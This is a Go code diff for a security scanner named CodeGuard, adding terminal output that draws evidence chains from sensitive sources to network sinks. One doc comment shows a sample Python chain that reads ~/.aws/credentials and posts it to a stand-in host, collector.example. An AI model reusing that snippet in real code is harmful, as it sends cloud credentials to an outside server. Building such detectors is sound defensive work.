@@ -82,6 +82,112 @@ func reasonsByCategory(reason string) map[string]string {
 	return out
 }
 
+// supportNote returns the engine's language-support note (the reason's first clause), or "".
+func supportNote(reason string) string {
+	first, _, _ := strings.Cut(reason, "; ")
+	if strings.HasPrefix(first, "language ") || strings.HasPrefix(first, "light (rule-based)") {
+		return first
+	}
+	return ""
+}
+
+var roleMark = map[string]string{"source": "●", "encoded": "◆", "decoded": "◇", "carrier": "▣", "step": "○", "sink": "■", "finding": "■",
+	"code": "○", "effect": "■"}
+
+// expandSteps: a single finding (one line, no path) is drawn as that line of code -> what it does.
+func expandSteps(e Evidence) []EvidenceStep {
+	if len(e.Steps) != 1 {
+		return e.Steps
+	}
+	s := e.Steps[0]
+	label := "this line"
+	if s.Line <= 0 {
+		label = "the snippet"
+	}
+	return []EvidenceStep{{Line: s.Line, Role: "code", Label: label, Code: s.Code}, {Line: s.Line, Role: "effect", Label: s.Label}}
+}
+
+func hasChain(v *Verdict) bool {
+	for _, e := range v.Evidence {
+		if len(e.Steps) > 1 {
+			return true
+		}
+	}
+	return false
+}
+
+// printChains draws up to max evidence chains top to bottom: each step is a node (its line and the
+// code on it), joined by arrows labelled with the variable the data flows through.
+//
+//	L2  ● reads sensitive file ~/.aws/credentials
+//	    │ data = open(os.path.expanduser("~/.aws/credentials")).read()
+//	    ▼ via data
+//	L3  ■ sent over the network
+//	    │ requests.post("https://collector.example/up", data=data)
+func printChains(w io.Writer, p palette, v *Verdict, max int) {
+	shown := 0
+	for _, e := range v.Evidence {
+		if shown == max {
+			break
+		}
+		if max < len(v.Evidence) && len(e.Steps) < 2 && hasChain(v) {
+			continue // in the short card, single findings are already listed under "why"
+		}
+		if shown > 0 {
+			fmt.Fprintln(w) // blank line between chains, none after the last
+		}
+		shown++
+		fmt.Fprintf(w, " %s%s%s  %s%s%s\n", p.red+p.bold, prettyCategory(e.Category), p.reset, p.dim, clip(e.Reason, 60), p.reset)
+		steps := expandSteps(e)
+		for i, s := range steps {
+			color := p.yellow
+			switch s.Role {
+			case "sink", "finding", "effect":
+				color = p.red
+			case "code":
+				color = p.dim
+			}
+			mark := roleMark[s.Role]
+			if mark == "" {
+				mark = "○"
+			}
+			line := "    "
+			if s.Line > 0 {
+				line = fmt.Sprintf("L%-3d", s.Line)
+			}
+			fmt.Fprintf(w, "   %s%s%s %s%s %s%s\n", p.dim, line, p.reset, color+p.bold, mark, clip(s.Label, 96), p.reset)
+			if s.Code != "" && (s.Role != "decoded") {
+				fmt.Fprintf(w, "        %s│ %s%s\n", p.dim, clip(s.Code, 74), p.reset)
+			}
+			if i < len(steps)-1 {
+				via := ""
+				if next := steps[i+1]; next.Via != "" {
+					via = " via " + next.Via
+				}
+				fmt.Fprintf(w, "        %s▼%s%s\n", p.dim, via, p.reset)
+			}
+		}
+	}
+}
+
+// printGraph: `codeguard scan --graph`, only the verdict line and every evidence chain.
+func printGraph(w io.Writer, p palette, v *Verdict, name string) {
+	color, mark := p.green, "✔ ALLOWED"
+	if v.Verdict == "block" {
+		color, mark = p.red, "✖ BLOCKED"
+	}
+	title := ""
+	if name != "" {
+		title = "  " + p.dim + clip(name, 50) + p.reset
+	}
+	fmt.Fprintf(w, " %s%s%s   risk %.2f   %s%s\n\n", color+p.bold, mark, p.reset, v.RiskScore, strings.Join(v.Categories, ", "), title)
+	if len(v.Evidence) == 0 {
+		fmt.Fprintf(w, " %sno evidence chain: %s%s\n", p.dim, clip(v.Reason, 70), p.reset)
+		return
+	}
+	printChains(w, p, v, len(v.Evidence))
+}
+
 // printCard: the verdict in one line, one reason per blocking category, the flagged lines, and one
 // line on what CodeGuard did. Only what a reviewer needs; `scan --json` has the full response.
 func printCard(w io.Writer, p palette, v *Verdict, code, name string) {
@@ -134,9 +240,15 @@ func printCard(w io.Writer, p palette, v *Verdict, code, name string) {
 		}
 		fmt.Fprintf(w, "\n %s\n", note)
 	}
+	if s := supportNote(v.Reason); s != "" { // light or missing language support: say so on every card
+		fmt.Fprintf(w, " %s%s%s\n", p.yellow, clip(s, 90), p.reset)
+	}
 
-	// 4. the flagged lines themselves
-	if blocked && len(v.VulnerableLines) > 0 && code != "" {
+	// 4. how the code gets there (evidence chain), or else the flagged lines themselves
+	if blocked && hasChain(v) {
+		fmt.Fprintln(w)
+		printChains(w, p, v, 2)
+	} else if blocked && len(v.VulnerableLines) > 0 && code != "" {
 		lines := strings.Split(strings.ReplaceAll(code, "\r\n", "\n"), "\n")
 		fmt.Fprintln(w)
 		for i, n := range v.VulnerableLines {
